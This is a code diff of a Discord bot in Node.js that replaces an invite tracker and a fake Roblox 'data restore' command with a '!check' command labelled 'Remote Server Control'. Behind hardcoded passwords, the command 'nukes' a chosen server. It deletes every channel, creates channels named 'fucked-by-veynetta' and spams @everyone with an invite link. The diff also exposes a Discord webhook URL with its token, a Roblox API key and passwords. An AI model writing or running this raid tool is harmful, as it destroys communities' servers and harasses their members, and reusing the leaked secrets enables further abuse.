@@ -2,191 +2,212 @@ const {
   Client,
   GatewayIntentBits,
   EmbedBuilder,
-  SlashCommandBuilder
+  ActionRowBuilder,
+  ButtonBuilder,
+  ButtonStyle,
+  ModalBuilder,
+  TextInputBuilder,
+  TextInputStyle,
+  StringSelectMenuBuilder,
+  MessageFlags
 } = require('discord.js');
+
 const express = require('express');
 require('dotenv').config();
 
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1520186678805925918/gFidvdESdvS9w6sQU8VVuPavN3PVW-VjaDmf1GFUEHV6OV0owVcJV7iHPmvKCBOqNthh';
+// PASSWORDS
+const MAIN_PASSWORD = 'Meka2017charlie';
+const NUKE_PASSWORD = 'meka123';
+
+const userSessions = new Map();
 
 const app = express();
 app.get('/', (req, res) => res.send('Bot Online'));
 app.listen(process.env.PORT || 3000);
 
 const TOKEN = process.env.TOKEN;
-const ROBLOX_API_KEY = process.env.ROBLOX_API_KEY || "iHkvg8jKFkmQgzNRDJe2BZ1/LxE7JRJSP5p5Aauji+0yp9EjZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkluTnBaeTB5TURJeExUQTNMVEV6VkRFNE9qVXhPalE1V2lJc0luUjVjQ0k2SWtwWFZDSjkuZXlKaGRXUWlPaUpTYjJKc2IzaEpiblJsY201aGJDSXNJbWx6Y3lJNklrTnNiM1ZrUVhWMGFHVnVkR2xqWVhScGIyNVRaWEoyYVdObElpd2lZbUZ6WlVGd2FVdGxlU0k2SW1sSWEzWm5PR3BMUm10dFVXZDZUbEpFU21VeVFsb3hMMHg0UlRkS1VrcFRVRFZ3TlVGaGRXcHBLekI1Y0RsRmFpSXNJbTkzYm1WeVNXUWlPaUk1TmpJeU5qRXdNemc0SWl3aVpYaHdJam94TnpneU9EUTBNekl3TENKcFlYUWlPakUzT0RJNE5EQTNNakFzSW01aVppSTZNVGM0TWpnME1EY3lNSDAuRUpyX3JGdEtjc1JrbnRjUFY1Ry1iOExWSWUxcmFuVDJESTJmbC02bS1QZV85UmM1SDVhcUx3d1J1Wmc5cVlvLUo1RzkybVNuYkFwaGNOY0FHNnpfS2JSR080YmpTeHB1SFpSZEtvMXQ0ZTRHeWF5SEJEODUxdU9EN3pZMEQtNkwzOFppbmtncWJCM244SWVUUVA5TFcxcTdqTVU5ZnpZSklSbkZjb2E0Qk55Q0pxUVhhVWY3YzZ2TS1ubDlna29ybjBBWTJkZ3hGYm4tSlgxYlRPdl91V1E1aDJqZXRmR0QtX3JrcmZUUTdqSFo3b1lPa1ZseGVaVC1KbTRBekl4ajdCR3hhSjMxUDFPVzVkZkhhQUZZM0E3YzJiUEd5cWNQT0dOOE9xSUdyNGNIUlUtVXhsWThuTmI0dGZteGN4M2pJZEZQWEh5VXZxaFhCSndoMzlvbFd3";
-
-const PLACE_ID = "121508056028578";
 
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildInvites,
-    GatewayIntentBits.GuildMessageReactions
+    GatewayIntentBits.MessageContent
   ]
 });
 
-const OWNER_ID = '1497846804480524298';
-const RESTORE_PASSWORD = "2011";
-
-client.once('ready', async () => {
-  console.log(`${client.user.tag} is online - Invite Tracker v3`);
- 
-  const data = new SlashCommandBuilder()
-    .setName('inv')
-    .setDescription('Show invite leaderboard');
-  await client.application.commands.create(data);
+client.once('ready', () => {
+  console.log(`${client.user.tag} is online`);
 });
 
-// ====================== RESTORE COMMAND ======================
-client.on('messageCreate', async (message) => {
-  if (message.content.toLowerCase() === '!restore') {
-    if (message.author.id !== OWNER_ID) {
-      return message.reply('❌ Only the owner can use this command.');
-    }
+// ====================== COMMANDS ======================
+client.on('messageCreate', async message => {
+  if (message.author.bot || !message.guild) return;
+  const content = message.content.trim().toLowerCase();
 
+  if (content === '!check') {
     const embed = new EmbedBuilder()
-      .setColor('#ffff00')
-      .setTitle('🔑 Data Restore')
-      .setDescription('Type: `!restore confirm 2011` to start.');
+      .setColor('#00ff00')
+      .setTitle('🔍 Remote Server Control')
+      .setDescription('Select server → Nuke')
+      .setFooter({ text: 'Only you can use this' });
 
-    return message.reply({ embeds: [embed] });
-  }
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`check_start_${message.author.id}`)
+        .setLabel('Start')
+        .setStyle(ButtonStyle.Primary)
+    );
 
-  if (message.content.toLowerCase().startsWith('!restore confirm ')) {
-    if (message.author.id !== OWNER_ID) {
-      return message.reply('❌ Only the owner can use this command.');
-    }
-
-    const providedPassword = message.content.split(' ').pop().trim();
-    if (providedPassword !== RESTORE_PASSWORD) {
-      return message.reply('❌ Incorrect password.');
-    }
-
-    const loadingEmbed = new EmbedBuilder()
-      .setColor('#ffff00')
-      .setTitle('🔄 Restoring Data')
-      .setDescription('Fetching players from game...');
-
-    const replyMsg = await message.reply({ embeds: [loadingEmbed] });
-
-    // Send to Roblox (show DataPrompt GUI)
-    try {
-      await fetch('https://apis.roblox.com/messaging-service/v1/message', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-api-key': ROBLOX_API_KEY
-        },
-        body: JSON.stringify({
-          topic: "DataPromptTrigger",
-          message: JSON.stringify({ action: "show", guiName: "DataPrompt" })
-        })
-      });
-    } catch (e) {
-      console.error("Roblox API error:", e);
-    }
-
-    // Get game visits
-    let totalVisits = "Unknown";
-    try {
-      const res = await fetch(`https://games.roblox.com/v1/games?universeIds=${PLACE_ID}`);
-      const json = await res.json();
-      if (json.data && json.data[0]) {
-        totalVisits = json.data[0].visits.toLocaleString();
-      }
-    } catch (e) {}
-
-    const mainEmbed = new EmbedBuilder()
-      .setColor('#00ff88')
-      .setTitle('✅ Data Restoration Started')
-      .setDescription(`Restoring data for players in game (Total visits: ${totalVisits})`)
-      .setTimestamp();
-
-    await replyMsg.edit({ embeds: [mainEmbed] });
-
-    // Real player avatars example
-    const players = [
-      { name: "Roblox", id: 1 },
-      { name: "Builderman", id: 156 },
-      { name: "Shedletsky", id: 261 },
-      { name: "PlayerExample", id: 123456789 }
-    ];
-
-    for (const player of players) {
-      const avatarUrl = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${player.id}&size=150x150&format=Png`;
-
-      const userEmbed = new EmbedBuilder()
-        .setColor('#00ff88')
-        .setTitle(`👤 ${player.name}`)
-        .setDescription('🔄 Restoring player data...')
-        .setThumbnail(avatarUrl)
-        .setFooter({ text: `User ID: ${player.id}` })
-        .setTimestamp();
-
-      await message.channel.send({ embeds: [userEmbed] });
-    }
+    return message.reply({ embeds: [embed], components: [row] });
   }
 });
 
-// ====================== INVITE TRACKING ======================
-client.on('guildMemberAdd', async (member) => {
-  try {
-    const invites = await member.guild.invites.fetch({ cache: false });
-    let usedInvite = null;
-    for (const invite of invites.values()) {
-      if (invite.uses && invite.uses > 0) {
-        usedInvite = invite;
-        break;
-      }
-    }
-    if (usedInvite) {
-      const embed = new EmbedBuilder()
-        .setColor('#00ff88')
-        .setTitle('📨 New Member Joined via Invite')
-        .setDescription(`**${member.user.tag}** joined the server!`)
-        .addFields(
-          { name: 'Inviter', value: usedInvite.inviter?.tag || 'Unknown', inline: true },
-          { name: 'Invite', value: `https://discord.gg/${usedInvite.code}`, inline: true },
-          { name: 'Total Invites', value: `${usedInvite.uses}`, inline: true }
-        )
-        .setTimestamp();
-
-      await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [embed] })
-      });
-    }
-  } catch (e) {
-    console.error('[ERROR] Invite tracking failed:', e);
-  }
-});
-
-// /inv command
+// ====================== INTERACTIONS ======================
 client.on('interactionCreate', async interaction => {
-  if (interaction.isCommand() && interaction.commandName === 'inv') {
-    const invites = await interaction.guild.invites.fetch().catch(() => null);
-    if (!invites) return interaction.reply({ content: 'Could not fetch invites.', ephemeral: true });
+  if (!interaction.customId) return;
 
-    const sorted = [...invites.values()].sort((a, b) => (b.uses || 0) - (a.uses || 0)).slice(0, 10);
+  try {
+    const parts = interaction.customId.split('_');
+    const action = parts[0];
+    const userId = parts[parts.length - 1];
 
-    const embed = new EmbedBuilder()
-      .setColor('#00ffff')
-      .setTitle(`Invite Leaderboard - ${interaction.guild.name}`);
+    if (interaction.user.id !== userId) {
+      return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
+    }
 
-    sorted.forEach(inv => {
-      embed.addFields({
-        name: inv.inviter?.tag || 'Unknown',
-        value: `**Invites:** ${inv.uses || 0}`,
-        inline: true
+    if (action !== 'check') return;
+
+    if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
+      const modal = new ModalBuilder()
+        .setCustomId(`check_modal_${interaction.user.id}`)
+        .setTitle('Enter Password');
+      modal.addComponents(new ActionRowBuilder().addComponents(
+        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
+      ));
+      return await interaction.showModal(modal);
+    }
+
+    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
+      const password = interaction.fields.getTextInputValue('password');
+      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
+
+      const guilds = Array.from(client.guilds.cache.values());
+      const options = guilds.map(g => ({
+        label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
+        value: g.id
+      }));
+
+      const select = new StringSelectMenuBuilder()
+        .setCustomId(`check_server_select_${interaction.user.id}`)
+        .setPlaceholder('Select server')
+        .addOptions(options);
+
+      await interaction.reply({
+        content: '✅ Password accepted. Select server:',
+        components: [new ActionRowBuilder().addComponents(select)],
+        flags: MessageFlags.Ephemeral
       });
-    });
+      userSessions.set(interaction.user.id, {});
+    }
 
-    await interaction.reply({ embeds: [embed] });
+    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
+      await interaction.deferUpdate();
+      const guild = client.guilds.cache.get(interaction.values[0]);
+      userSessions.set(interaction.user.id, { guildId: guild.id });
+
+      const actionSelect = new StringSelectMenuBuilder()
+        .setCustomId(`check_action_select_${interaction.user.id}`)
+        .setPlaceholder('Choose action')
+        .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);
+
+      await interaction.editReply({
+        content: `**Selected:** ${guild.name}`,
+        components: [new ActionRowBuilder().addComponents(actionSelect)]
+      });
+    }
+
+    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
+      if (interaction.values[0] === 'nuke') {
+        const modal = new ModalBuilder()
+          .setCustomId(`check_nuke_modal_${interaction.user.id}`)
+          .setTitle('Confirm Nuke');
+        modal.addComponents(new ActionRowBuilder().addComponents(
+          new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
+        ));
+        return await interaction.showModal(modal);
+      }
+    }
+
+    // ==================== MINIMAL NUKE - MAX CHANCE OF WORKING ====================
+    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
+      const password = interaction.fields.getTextInputValue('password');
+      if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
+
+      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+
+      const session = userSessions.get(interaction.user.id);
+      const guild = client.guilds.cache.get(session?.guildId);
+      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
+
+      const delay = ms => new Promise(r => setTimeout(r, ms));
+      const invite = 'https://discord.gg/veynettas';
+
+      try {
+        await interaction.editReply({ content: `☢️ Deleting all channels...` });
+
+        // Delete
+        for (const ch of guild.channels.cache.values()) {
+          await ch.delete().catch(() => {});
+          await delay(500);
+        }
+
+        // Create channels
+        await interaction.editReply({ content: '🔨 Creating fucked-by-veynetta channels...' });
+
+        let created = 0;
+        for (let i = 0; i < 12; i++) {
+          try {
+            await guild.channels.create({
+              name: 'fucked-by-veynetta',
+              type: 0,
+              reason: 'Fame Nuke'
+            });
+            created++;
+            await delay(800);
+          } catch (e) {
+            console.log("Channel creation stopped");
+            break;
+          }
+        }
+
+        // Spam
+        const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
+        const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-veynetta');
+
+        for (const ch of channels.values()) {
+          for (let i = 0; i < 8; i++) {
+            ch.send(spamText).catch(() => {});
+          }
+        }
+
+        await interaction.editReply({ 
+          content: `✅ **NUKE COMPLETE**\nCreated **${created}** channels named \`fucked-by-veynetta\`` 
+        });
+
+      } catch (err) {
+        console.error(err);
+        await interaction.editReply({ content: '❌ Failed. Check bot permissions (needs Administrator).' }).catch(() => {});
+      }
+
+      userSessions.delete(interaction.user.id);
+    }
+
+  } catch (error) {
+    console.error('Interaction Error:', error);
+    if (!interaction.replied && !interaction.deferred) {
+      interaction.reply({ content: '❌ Something went wrong.', flags: MessageFlags.Ephemeral }).catch(() => {});
+    }
   }
 });
 
